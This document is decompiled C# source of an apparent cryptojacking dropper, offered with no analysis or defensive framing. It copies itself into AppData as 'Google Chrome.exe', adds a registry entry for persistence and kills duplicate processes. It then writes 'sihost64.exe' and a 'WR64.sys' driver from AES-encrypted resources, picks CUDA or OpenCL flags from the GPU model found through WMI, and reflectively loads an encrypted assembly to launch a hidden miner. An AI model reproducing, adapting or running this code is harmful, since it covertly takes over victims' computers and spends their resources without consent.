using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class GClass0
{
	public static string string_0 = Conversions.ToString(smethod_2("FiBP96DTBeNko1prTOHnMw=="));

	public static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_0;

	[STAThread]
	public static void Main()
	{
		Registry.CurrentUser.CreateSubKey(Conversions.ToString(smethod_2("lCIu9JXZxPCDfyd7b9gLWVg4vs93zOVwnpi4E3m9XPpWBWUewQnDlexHGse0pxFp"))).SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "Google Chrome.exe")), Path.Combine(Interaction.Environ("AppData"), "Google Chrome.exe"));
		smethod_0();
		smethod_6();
	}

	public static void smethod_0()
	{
		GClass0.smethod_14(2000);
		try
		{
			if (GClass0.smethod_18(GClass0.smethod_17(GClass0.smethod_16(GClass0.smethod_15())), GClass0.smethod_13(GClass0.smethod_12("AppData"), "Google Chrome.exe"), bool_0: false) == 0)
			{
				return;
			}
			Process[] array = GClass0.smethod_19();
			foreach (Process process_ in array)
			{
				try
				{
					if (GClass0.smethod_18(GClass0.smethod_17(GClass0.smethod_16(process_)), GClass0.smethod_13(GClass0.smethod_12("AppData"), "Google Chrome.exe"), bool_0: false) == 0)
					{
						GClass0.smethod_20(process_);
					}
				}
				catch (Exception exception_)
				{
					GClass0.smethod_21(exception_);
					GClass0.smethod_22();
				}
			}
			GClass0.smethod_24(GClass0.smethod_13(GClass0.smethod_12("AppData"), "Google Chrome.exe"), GClass0.smethod_23(GClass0.smethod_17(GClass0.smethod_16(GClass0.smethod_15()))));
			GClass0.smethod_14(2000);
			smethod_4();
			GClass0.smethod_25(0);
		}
		catch (Exception exception_2)
		{
			GClass0.smethod_21(exception_2);
			GClass0.smethod_22();
		}
	}

	public static byte[] smethod_1(string string_2)
	{
		Assembly assembly_ = GClass0.smethod_26();
		ResourceManager resourceManager_ = GClass0.smethod_27("agbhtfjxzgieervygnstsnapfzclvyjnnhhhuzv", assembly_);
		return smethod_8((byte[])GClass0.smethod_28(resourceManager_, string_2));
	}

	public static object smethod_2(string string_2)
	{
		return GClass0.smethod_31(GClass0.smethod_29(), smethod_8(GClass0.smethod_30(string_2)));
	}

	public static void smethod_3(byte[] byte_0, string string_2, byte[] byte_1)
	{
		try
		{
			GClass0.smethod_36((MethodBase)GClass0.smethod_34(GClass0.smethod_33(GClass0.smethod_32(byte_0), GClass0.smethod_9(smethod_2("+brrmWCdqapQRy8RnKmha19V9SJyq0476Xe8o6KDkHo="))), GClass0.smethod_9(smethod_2("BCJinqql+t/BbaoI24Fc8A==")), BindingFlags.Static | BindingFlags.Public), (object)null, new object[3]
			{
				byte_1,
				GClass0.smethod_35(GClass0.smethod_35(smethod_2("a1/TLN/b+7uDm2i71e1R0w=="), (object)"\\"), smethod_2("wzKnab+AoioX0CaKfARB4A==")),
				string_2
			});
		}
		catch (Exception exception_)
		{
			GClass0.smethod_21(exception_);
			GClass0.smethod_22();
		}
	}

	public static void smethod_4()
	{
		try
		{
			GClass0.smethod_37(string_1);
			GClass0.smethod_39(GClass0.smethod_11(GClass0.smethod_10(Environment.SpecialFolder.ApplicationData), "\\", GClass0.smethod_38(string_0, new char[1] { '\\' })[0]));
			Process[] array = GClass0.smethod_40("sihost64");
			foreach (Process process_ in array)
			{
				GClass0.smethod_20(process_);
			}
			GClass0.smethod_14(3000);
			GClass0.smethod_24(GClass0.smethod_41(string_1, "sihost64.exe"), smethod_1("isoogfgsccecndvyqpjcehclhdxsnjlipj"));
			if (GClass0.smethod_40("sihost64").Length < 1)
			{
				GClass0.smethod_42(GClass0.smethod_41(string_1, "sihost64.exe"));
			}
			GClass0.smethod_24(GClass0.smethod_41(string_1, "WR64.sys"), smethod_1("lgtujvkqpndvasiivghwwgqrsgdkoyngyftwvd"));
		}
		catch (Exception exception_)
		{
			GClass0.smethod_21(exception_);
			GClass0.smethod_22();
		}
	}

	public static object smethod_5()
	{
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ConnectionOptions connectionOptions_ = default(ConnectionOptions);
		ManagementScope managementScope_ = default(ManagementScope);
		string string_ = default(string);
		ObjectQuery objectQuery_ = default(ObjectQuery);
		ManagementObjectSearcher managementObjectSearcher_ = default(ManagementObjectSearcher);
		ManagementObjectCollection managementObjectCollection_ = default(ManagementObjectCollection);
		ManagementObjectEnumerator val = default(ManagementObjectEnumerator);
		ManagementObject managementBaseObject_ = default(ManagementObject);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					GClass0.smethod_22();
					num3 = 1;
					goto IL_0007;
				case 341:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001a;
						case 5:
							goto IL_0039;
						case 6:
							goto IL_0042;
						case 7:
							goto IL_005f;
						case 8:
							goto IL_006a;
						case 9:
							goto IL_0077;
						case 10:
							goto IL_0083;
						case 11:
							goto IL_00a3;
						case 14:
						case 15:
							goto IL_00c3;
						case 16:
							goto IL_00d1;
						case 12:
							goto IL_00e0;
						case 13:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 0:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00e0:
					num = 12;
					GClass0.smethod_25(0);
					break;
					IL_0007:
					num = 2;
					connectionOptions_ = GClass0.smethod_43();
					goto IL_0010;
					IL_0010:
					num = 3;
					GClass0.smethod_44(connectionOptions_, (ImpersonationLevel)3);
					goto IL_001a;
					IL_001a:
					num = 4;
					managementScope_ = GClass0.smethod_46(GClass0.smethod_11("\\\\", GClass0.smethod_45(), "\\root\\cimv2"), connectionOptions_);
					goto IL_0039;
					IL_0039:
					num = 5;
					GClass0.smethod_47(managementScope_);
					goto IL_0042;
					IL_0042:
					num = 6;
					string_ = GClass0.smethod_49("Select CommandLine from Win32_Process where Name='{0}'", GClass0.smethod_48(smethod_2("wzKnab+AoioX0CaKfARB4A==")));
					goto IL_005f;
					IL_005f:
					num = 7;
					objectQuery_ = GClass0.smethod_50(string_);
					goto IL_006a;
					IL_006a:
					num = 8;
					managementObjectSearcher_ = GClass0.smethod_51(managementScope_, objectQuery_);
					goto IL_0077;
					IL_0077:
					num = 9;
					managementObjectCollection_ = GClass0.smethod_52(managementObjectSearcher_);
					goto IL_0083;
					IL_0083:
					num = 10;
					val = GClass0.smethod_53(managementObjectCollection_);
					goto IL_008e;
					IL_008e:
					if (GClass0.smethod_58(val))
					{
						managementBaseObject_ = (ManagementObject)GClass0.smethod_54(val);
						goto IL_00a3;
					}
					if (val != null)
					{
						GClass0.smethod_59((IDisposable)val);
					}
					goto IL_00d1;
					IL_00d1:
					num = 16;
					obj = false;
					goto end_IL_0000_3;
					IL_00a3:
					num = 11;
					if (!GClass0.smethod_57(GClass0.smethod_56(GClass0.smethod_55((ManagementBaseObject)(object)managementBaseObject_, "CommandLine")), "--donate-l"))
					{
						goto IL_00c3;
					}
					goto IL_00e0;
					IL_00c3:
					num = 15;
					goto IL_008e;
					end_IL_0000_2:
					break;
				}
				num = 13;
				obj = true;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				GClass0.smethod_21((Exception)obj2);
				try0000_dispatch = 341;
				continue;
			}
			throw GClass0.smethod_60(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			GClass0.smethod_22();
		}
		return result;
	}

	public static void smethod_6()
	{
		if (GClass0.smethod_61((object)"30") && GClass0.smethod_62("30") > 0)
		{
			GClass0.smethod_14(checked(GClass0.smethod_62("30") * 1000));
		}
		try
		{
			byte[] byte_ = smethod_1("sdpthetwpotbgiisasoguhccggdhnrpvpjwurux");
			byte[] byte_2 = new byte[0];
			string text = "";
			smethod_4();
			try
			{
				try
				{
					ZipArchive zipArchive = GClass0.smethod_64((Stream)GClass0.smethod_63(byte_));
					try
					{
						IEnumerator<ZipArchiveEntry> enumerator = default(IEnumerator<ZipArchiveEntry>);
						try
						{
							enumerator = GClass0.smethod_65(zipArchive).GetEnumerator();
							while (GClass0.smethod_71((IEnumerator)enumerator))
							{
								ZipArchiveEntry current = enumerator.Current;
								if (!GClass0.smethod_57(GClass0.smethod_66(current), "xm"))
								{
									continue;
								}
								Stream stream = GClass0.smethod_67(current);
								try
								{
									object obj = GClass0.smethod_68();
									try
									{
										GClass0.smethod_69(stream, (Stream)obj);
										byte_2 = (byte[])GClass0.smethod_70(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
									}
									finally
									{
										if (obj != null)
										{
											GClass0.smethod_59((IDisposable)obj);
										}
									}
								}
								finally
								{
									if (stream != null)
									{
										GClass0.smethod_59((IDisposable)stream);
									}
								}
							}
						}
						finally
						{
							if (enumerator != null)
							{
								GClass0.smethod_59((IDisposable)enumerator);
							}
						}
					}
					finally
					{
						if (zipArchive != null)
						{
							GClass0.smethod_59((IDisposable)zipArchive);
						}
					}
				}
				catch (Exception exception_)
				{
					GClass0.smethod_21(exception_);
					GClass0.smethod_22();
				}
				string string_ = smethod_7();
				if (GClass0.smethod_57(GClass0.smethod_72(string_), "nvidia") || GClass0.smethod_57(GClass0.smethod_72(string_), "amd"))
				{
					try
					{
						byte[] byte_3 = smethod_1("ttthmszakcsbdiwvhnqsqkuhzidxhauwf");
						ZipArchive zipArchive2 = GClass0.smethod_64((Stream)GClass0.smethod_63(byte_3));
						try
						{
							IEnumerator<ZipArchiveEntry> enumerator2 = default(IEnumerator<ZipArchiveEntry>);
							try
							{
								enumerator2 = GClass0.smethod_65(zipArchive2).GetEnumerator();
								while (GClass0.smethod_71((IEnumerator)enumerator2))
								{
									ZipArchiveEntry current2 = enumerator2.Current;
									GClass0.smethod_73(current2, GClass0.smethod_13(string_1, GClass0.smethod_66(current2)), bool_0: true);
								}
							}
							finally
							{
								if (enumerator2 != null)
								{
									GClass0.smethod_59((IDisposable)enumerator2);
								}
							}
						}
						finally
						{
							if (zipArchive2 != null)
							{
								GClass0.smethod_59((IDisposable)zipArchive2);
							}
						}
						if (GClass0.smethod_57(GClass0.smethod_72(string_), "nvidia"))
						{
							text = GClass0.smethod_74(text, " --cuda --cuda-loader=\"", string_1, "ddb64.dll\"");
						}
						if (GClass0.smethod_57(GClass0.smethod_72(string_), "amd"))
						{
							text = GClass0.smethod_41(text, " --opencl ");
						}
					}
					catch (Exception exception_2)
					{
						GClass0.smethod_21(exception_2);
						GClass0.smethod_22();
					}
				}
			}
			catch (Exception exception_3)
			{
				GClass0.smethod_21(exception_3);
				GClass0.smethod_22();
			}
			string string_2 = GClass0.smethod_9(GClass0.smethod_75(smethod_2("kSRCTRAgd9aR8cX3LDKYsN4J4G6+4YNaeU1izx3acl6IzsoRWUgfw4UNtYRvrWifNbLtQEx76sVIk3PXMWZ2lrPczUR1M6fhYF3Co1V2XrdXadCighT2xOfkt4udgEC6jidsREIHGxWW4znGcGWo2XFYGY3HZWOwzo9ErdMN6kgEoTHA2f8bDHdBpSMyr8/xlxEVKw2BjWeJaJ1I626ob6tMridyIbCs14CTkc0WnrVKlklmYHFq1is/RB/DmoE94rulQRdJTF2ZQAw+V1CrX5gQKTiNLqPxWVuqVWwjpAY85BNxa7UeixbDKXyOFY+iQxLr4C+mZI/sntPGudorYinmGCUxDZhybYVeEz7TdbTzftUAMBqRY4cJzQPFKF1SMS+lZlAnYycRdgx9wE0bms/voBm3NnUYsfPOUtF4YjKuzS2L7bYfFwCveh9OeVPDx9xpsGvX7UmRcaD/U/LBBO4tT+F36TIwSApBCctlbKdYcx8pQkAHxuxfMNUx/otvVGdL/ANAQMa26snA5C0b4w=="), (object)text));
			string_2 = GClass0.smethod_78(string_2, "{%RANDOM%}", GClass0.smethod_77(GClass0.smethod_76(Guid.NewGuid().ToString(), "-", ""), 0, 10), 1, -1, (CompareMethod)0);
			string_2 = GClass0.smethod_78(string_2, "{%COMPUTERNAME%}", GClass0.smethod_77(GClass0.smethod_81(GClass0.smethod_80(GClass0.smethod_79()), "[^a-zA-Z0-9]", ""), 0, 10), 1, -1, (CompareMethod)0);
			smethod_5();
			smethod_3(smethod_1("qjggchre"), string_2, byte_2);
		}
		catch (Exception exception_4)
		{
			GClass0.smethod_21(exception_4);
			GClass0.smethod_22();
		}
	}

	public static string smethod_7()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		try
		{
			string text = "";
			ObjectQuery objectQuery_ = GClass0.smethod_50("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher managementObjectSearcher_ = GClass0.smethod_82(objectQuery_);
			ManagementObjectEnumerator val = default(ManagementObjectEnumerator);
			try
			{
				val = GClass0.smethod_53(GClass0.smethod_52(managementObjectSearcher_));
				while (GClass0.smethod_58(val))
				{
					ManagementObject managementBaseObject_ = (ManagementObject)GClass0.smethod_54(val);
					text = GClass0.smethod_9(GClass0.smethod_35(GClass0.smethod_35((object)text, GClass0.smethod_55((ManagementBaseObject)(object)managementBaseObject_, "VideoProcessor")), (object)" "));
				}
			}
			finally
			{
				if (val != null)
				{
					GClass0.smethod_59((IDisposable)val);
				}
			}
			if (!GClass0.smethod_57(GClass0.smethod_72(text), "nvidia") && !GClass0.smethod_57(GClass0.smethod_72(text), "amd"))
			{
				ManagementObjectEnumerator val2 = default(ManagementObjectEnumerator);
				try
				{
					val2 = GClass0.smethod_53(GClass0.smethod_52(managementObjectSearcher_));
					while (GClass0.smethod_58(val2))
					{
						ManagementObject managementBaseObject_2 = (ManagementObject)GClass0.smethod_54(val2);
						text = GClass0.smethod_9(GClass0.smethod_35(GClass0.smethod_35((object)text, GClass0.smethod_55((ManagementBaseObject)(object)managementBaseObject_2, "Name")), (object)" "));
					}
				}
				finally
				{
					if (val2 != null)
					{
						GClass0.smethod_59((IDisposable)val2);
					}
				}
				if (!GClass0.smethod_57(GClass0.smethod_72(text), "nvidia") && !GClass0.smethod_57(GClass0.smethod_72(text), "amd"))
				{
					return "";
				}
				return text;
			}
			return text;
		}
		catch (Exception exception_)
		{
			GClass0.smethod_21(exception_);
			string result = "";
			GClass0.smethod_22();
			return result;
		}
	}

	public static byte[] smethod_8(byte[] byte_0)
	{
		RijndaelManaged symmetricAlgorithm_ = GClass0.smethod_83();
		MD5CryptoServiceProvider hashAlgorithm_ = GClass0.smethod_84();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] array_ = GClass0.smethod_86((HashAlgorithm)hashAlgorithm_, GClass0.smethod_85(GClass0.smethod_29(), "bjddsflppyqinyxj"));
			GClass0.smethod_87((Array)array_, 0, (Array)array, 0, 16);
			GClass0.smethod_87((Array)array_, 0, (Array)array, 15, 16);
			GClass0.smethod_88((SymmetricAlgorithm)symmetricAlgorithm_, array);
			GClass0.smethod_89((SymmetricAlgorithm)symmetricAlgorithm_, CipherMode.ECB);
			ICryptoTransform icryptoTransform_ = GClass0.smethod_90((SymmetricAlgorithm)symmetricAlgorithm_);
			result = GClass0.smethod_91(icryptoTransform_, byte_0, 0, byte_0.Length);
			return result;
		}
		catch (Exception exception_)
		{
			GClass0.smethod_21(exception_);
			GClass0.smethod_22();
			return result;
		}
	}

	static string smethod_9(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	static string smethod_10(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string smethod_11(string string_2, string string_3, string string_4)
	{
		return string_2 + string_3 + string_4;
	}

	static string smethod_12(string string_2)
	{
		return Interaction.Environ(string_2);
	}

	static string smethod_13(string string_2, string string_3)
	{
		return Path.Combine(string_2, string_3);
	}

	static void smethod_14(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static Process smethod_15()
	{
		return Process.GetCurrentProcess();
	}

	static ProcessModule smethod_16(Process process_0)
	{
		return process_0.MainModule;
	}

	static string smethod_17(ProcessModule processModule_0)
	{
		return processModule_0.FileName;
	}

	static int smethod_18(string string_2, string string_3, bool bool_0)
	{
		return Operators.CompareString(string_2, string_3, bool_0);
	}

	static Process[] smethod_19()
	{
		return Process.GetProcesses();
	}

	static void smethod_20(Process process_0)
	{
		process_0.Kill();
	}

	static void smethod_21(Exception exception_0)
	{
		ProjectData.SetProjectError(exception_0);
	}

	static void smethod_22()
	{
		ProjectData.ClearProjectError();
	}

	static byte[] smethod_23(string string_2)
	{
		return File.ReadAllBytes(string_2);
	}

	static void smethod_24(string string_2, byte[] byte_0)
	{
		File.WriteAllBytes(string_2, byte_0);
	}

	static void smethod_25(int int_0)
	{
		Environment.Exit(int_0);
	}

	static Assembly smethod_26()
	{
		return Assembly.GetExecutingAssembly();
	}

	static ResourceManager smethod_27(string string_2, Assembly assembly_0)
	{
		return new ResourceManager(string_2, assembly_0);
	}

	static object smethod_28(ResourceManager resourceManager_0, string string_2)
	{
		return resourceManager_0.GetObject(string_2);
	}

	static Encoding smethod_29()
	{
		return Encoding.ASCII;
	}

	static byte[] smethod_30(string string_2)
	{
		return Convert.FromBase64String(string_2);
	}

	static string smethod_31(Encoding encoding_0, byte[] byte_0)
	{
		return encoding_0.GetString(byte_0);
	}

	static Assembly smethod_32(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static Type smethod_33(Assembly assembly_0, string string_2)
	{
		return assembly_0.GetType(string_2);
	}

	static MethodInfo smethod_34(Type type_0, string string_2, BindingFlags bindingFlags_0)
	{
		return type_0.GetMethod(string_2, bindingFlags_0);
	}

	static object smethod_35(object object_0, object object_1)
	{
		return Operators.ConcatenateObject(object_0, object_1);
	}

	static object smethod_36(MethodBase methodBase_0, object object_0, object[] object_1)
	{
		return methodBase_0.Invoke(object_0, object_1);
	}

	static DirectoryInfo smethod_37(string string_2)
	{
		return Directory.CreateDirectory(string_2);
	}

	static string[] smethod_38(string string_2, char[] char_0)
	{
		return string_2.Split(char_0);
	}

	static DirectoryInfo smethod_39(string string_2)
	{
		return new DirectoryInfo(string_2);
	}

	static Process[] smethod_40(string string_2)
	{
		return Process.GetProcessesByName(string_2);
	}

	static string smethod_41(string string_2, string string_3)
	{
		return string_2 + string_3;
	}

	static Process smethod_42(string string_2)
	{
		return Process.Start(string_2);
	}

	static ConnectionOptions smethod_43()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ConnectionOptions();
	}

	static void smethod_44(ConnectionOptions connectionOptions_0, ImpersonationLevel impersonationLevel_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		connectionOptions_0.set_Impersonation(impersonationLevel_0);
	}

	static string smethod_45()
	{
		return Environment.UserDomainName;
	}

	static ManagementScope smethod_46(string string_2, ConnectionOptions connectionOptions_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new ManagementScope(string_2, connectionOptions_0);
	}

	static void smethod_47(ManagementScope managementScope_0)
	{
		managementScope_0.Connect();
	}

	static object smethod_48(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static string smethod_49(string string_2, object object_0)
	{
		return string.Format(string_2, object_0);
	}

	static ObjectQuery smethod_50(string string_2)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new ObjectQuery(string_2);
	}

	static ManagementObjectSearcher smethod_51(ManagementScope managementScope_0, ObjectQuery objectQuery_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new ManagementObjectSearcher(managementScope_0, objectQuery_0);
	}

	static ManagementObjectCollection smethod_52(ManagementObjectSearcher managementObjectSearcher_0)
	{
		return managementObjectSearcher_0.Get();
	}

	static ManagementObjectEnumerator smethod_53(ManagementObjectCollection managementObjectCollection_0)
	{
		return managementObjectCollection_0.GetEnumerator();
	}

	static ManagementBaseObject smethod_54(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		return managementObjectEnumerator_0.get_Current();
	}

	static object smethod_55(ManagementBaseObject managementBaseObject_0, string string_2)
	{
		return managementBaseObject_0.get_Item(string_2);
	}

	static string smethod_56(object object_0)
	{
		return object_0.ToString();
	}

	static bool smethod_57(string string_2, string string_3)
	{
		return string_2.Contains(string_3);
	}

	static bool smethod_58(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		return managementObjectEnumerator_0.MoveNext();
	}

	static void smethod_59(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Exception smethod_60(int int_0)
	{
		return ProjectData.CreateProjectError(int_0);
	}

	static bool smethod_61(object object_0)
	{
		return Versioned.IsNumeric(object_0);
	}

	static int smethod_62(string string_2)
	{
		return Conversions.ToInteger(string_2);
	}

	static MemoryStream smethod_63(byte[] byte_0)
	{
		return new MemoryStream(byte_0);
	}

	static ZipArchive smethod_64(Stream stream_0)
	{
		return new ZipArchive(stream_0);
	}

	static ReadOnlyCollection<ZipArchiveEntry> smethod_65(ZipArchive zipArchive_0)
	{
		return zipArchive_0.Entries;
	}

	static string smethod_66(ZipArchiveEntry zipArchiveEntry_0)
	{
		return zipArchiveEntry_0.FullName;
	}

	static Stream smethod_67(ZipArchiveEntry zipArchiveEntry_0)
	{
		return zipArchiveEntry_0.Open();
	}

	static MemoryStream smethod_68()
	{
		return new MemoryStream();
	}

	static void smethod_69(Stream stream_0, Stream stream_1)
	{
		stream_0.CopyTo(stream_1);
	}

	static object smethod_70(object object_0, Type type_0, string string_2, object[] object_1, string[] string_3, Type[] type_1, bool[] bool_0)
	{
		return NewLateBinding.LateGet(object_0, type_0, string_2, object_1, string_3, type_1, bool_0);
	}

	static bool smethod_71(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static string smethod_72(string string_2)
	{
		return string_2.ToLower();
	}

	static void smethod_73(ZipArchiveEntry zipArchiveEntry_0, string string_2, bool bool_0)
	{
		zipArchiveEntry_0.ExtractToFile(string_2, bool_0);
	}

	static string smethod_74(string string_2, string string_3, string string_4, string string_5)
	{
		return string_2 + string_3 + string_4 + string_5;
	}

	static object smethod_75(object object_0, object object_1)
	{
		return Operators.AddObject(object_0, object_1);
	}

	static string smethod_76(string string_2, string string_3, string string_4)
	{
		return string_2.Replace(string_3, string_4);
	}

	static string smethod_77(string string_2, int int_0, int int_1)
	{
		return string_2.Substring(int_0, int_1);
	}

	static string smethod_78(string string_2, string string_3, string string_4, int int_0, int int_1, CompareMethod compareMethod_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		return Strings.Replace(string_2, string_3, string_4, int_0, int_1, compareMethod_0);
	}

	static string smethod_79()
	{
		return Environment.MachineName;
	}

	static string smethod_80(string string_2)
	{
		return string_2.ToString();
	}

	static string smethod_81(string string_2, string string_3, string string_4)
	{
		return Regex.Replace(string_2, string_3, string_4);
	}

	static ManagementObjectSearcher smethod_82(ObjectQuery objectQuery_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new ManagementObjectSearcher(objectQuery_0);
	}

	static RijndaelManaged smethod_83()
	{
		return new RijndaelManaged();
	}

	static MD5CryptoServiceProvider smethod_84()
	{
		return new MD5CryptoServiceProvider();
	}

	static byte[] smethod_85(Encoding encoding_0, string string_2)
	{
		return encoding_0.GetBytes(string_2);
	}

	static byte[] smethod_86(HashAlgorithm hashAlgorithm_0, byte[] byte_0)
	{
		return hashAlgorithm_0.ComputeHash(byte_0);
	}

	static void smethod_87(Array array_0, int int_0, Array array_1, int int_1, int int_2)
	{
		Array.Copy(array_0, int_0, array_1, int_1, int_2);
	}

	static void smethod_88(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		symmetricAlgorithm_0.Key = byte_0;
	}

	static void smethod_89(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0)
	{
		symmetricAlgorithm_0.Mode = cipherMode_0;
	}

	static ICryptoTransform smethod_90(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		return symmetricAlgorithm_0.CreateDecryptor();
	}

	static byte[] smethod_91(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1)
	{
		return icryptoTransform_0.TransformFinalBlock(byte_0, int_0, int_1);
	}
}
